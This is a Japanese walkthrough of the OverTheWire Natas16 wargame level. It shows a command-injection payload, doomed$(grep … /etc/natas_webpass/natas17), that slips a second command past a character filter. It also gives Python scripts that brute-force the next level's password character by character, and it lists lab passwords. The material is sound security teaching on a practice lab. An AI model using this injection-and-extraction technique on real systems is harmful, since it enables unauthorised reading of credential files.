# Natas16
```
Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
URL:      http://natas16.natas.labs.overthewire.org
```

`For security reasons, we now filter even more on certain characters`と、特定の文字を禁止されたらしい。

とりあえず`View sourcecode`
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
```
passthru("grep -i \"$key\" dictionary.txt");
```
`grep -i 入力した文字 dictionary.txt`となっている。  
このコマンドは「入力した文字がパスワードの文字に入っているか？」を調べるものである。  
つまりLevel15の時のように全通り試せば良いというわけである。  

`doomed$(grep 調べる文字 /etc/natas_webpass/natas17)`
で調べることができる。

今回はその文字が入っているとdoomedと表示されるので、Level15とは逆である点に注意。

残念ながらpythonが書けないのでカンニング
https://www.abatchy.com/2016/11/natas-level-16
```
import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')  
  
filteredchars = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
for char in allchars:  
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
   
 if 'doomed' not in r.text:  
  filteredchars = filteredchars + char  
  print(filteredchars)  
```


実行すると、`bhjkoqsvwCEFHJLNOT57890`が使用されているのがわかる

これをpayloadとしてアタックすればいい
```
import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')  
  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
for char in allchars:  
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
   
 if 'doomed' not in r.text:  
  filteredchars = filteredchars + char  
  print(filteredchars)  
  
for i in range(32):  
 for char in filteredchars:  
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
  if 'doomed' not in r.text:  
   passwd = passwd + char  
   print(passwd)  
   break  
```
これで答えが得られる
```
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```



おまけ  
使用されている文字を解析→その文字を使用して並び替え特定をするプログラム
```
import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')  
  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
for char in allchars:  
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
   
 if 'doomed' not in r.text:  
  filteredchars = filteredchars + char  
  print(filteredchars)  
  
for i in range(32):  
 for char in filteredchars:  
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
  if 'doomed' not in r.text:  
   passwd = passwd + char  
   print(passwd)  
   break 
```